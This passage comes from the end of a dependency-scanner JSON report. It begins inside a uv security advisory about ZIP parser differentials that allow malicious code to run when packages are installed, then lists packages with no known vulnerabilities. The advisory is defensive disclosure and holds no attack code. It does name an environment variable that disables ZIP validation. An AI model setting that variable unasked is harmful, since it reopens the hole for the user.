sufficient for execution of malicious code, the vicim would need to perform a separate invocation, e.g., `python -c \"import $package\"`. - If a ZIP-based source distribution (which are less common than tarball source distributions), is encountered, malicious code can be executed during package resolution or installation. uv may invoke the malicious code when building the source distribution into a wheel.  ### Patches  Versions 0.9.6 and newer of uv address both of the parser differentials above, by properly handling comments in central directory entries and by refusing to process ZIPs that contain filename fields that are unlikely to be interpreted consistently across other ZIP parser implementations.  ### Workarounds  Users are advised to upgrade to 0.9.6 or newer to address this advisory.  Most users should experience no breaking changes as a result of the patch above. However, users who do experience breakage should carefully review their distributions for signs of malicious intent. Users may choose to set `UV_INSECURE_NO_ZIP_VALIDATION=1` to revert to the previous behavior.  ### Attribution  This vulnerability was disclosed by Caleb Brown (Google)."}]}, {"name": "uvicorn", "version": "0.35.0", "vulns": []}, {"name": "uvloop", "version": "0.21.0", "vulns": []}, {"name": "vine", "version": "5.1.0", "vulns": []}, {"name": "virtualenv", "version": "20.35.3", "vulns": []}, {"name": "wasabi", "version": "1.1.3", "vulns": []}, {"name": "watchdog", "version": "6.0.0", "vulns": []}, {"name": "watchfiles", "version": "1.1.0", "vulns": []}, {"name": "wcmatch", "version": "8.5.1", "vulns": []}, {"name": "wcwidth", "version": "0.2.14", "vulns": []}, {"name": "weasel", "version": "0.4.1", "vulns": []}, {"name": "webcolors", "version": "25.10.0", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.9.0", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "werkzeug", "version": "3.1.3", "vulns": []}, {"name": "wheel", "version": "0.45.1", "vulns": []}, {"name": "widgetsnbextension", "version": "4.0.15", "vulns": []}, {"name": "wrapt", "version": "1.17.3", "vulns": []}, {"name": "wsproto", "version": "1.2.0", "vulns": []}, {"name": "xattr", "version": "1.3.0", "vulns": []}, {"name": "xlsxwriter", "version": "3.2.9", "vulns": []}, {"name": "xxhash", "version": "3.6.0", "vulns": []}, {"name": "yarl", "version": "1.21.0", "vulns": []}, {"name": "zipp", "version": "3.23.0", "vulns": []}, {"name": "zope-event", "version": "6.0", "vulns": []}, {"name": "zope-interface", "version": "8.0.1", "vulns": []}, {"name": "zstandard", "version": "0.23.0", "vulns": []}], "fixes": []}
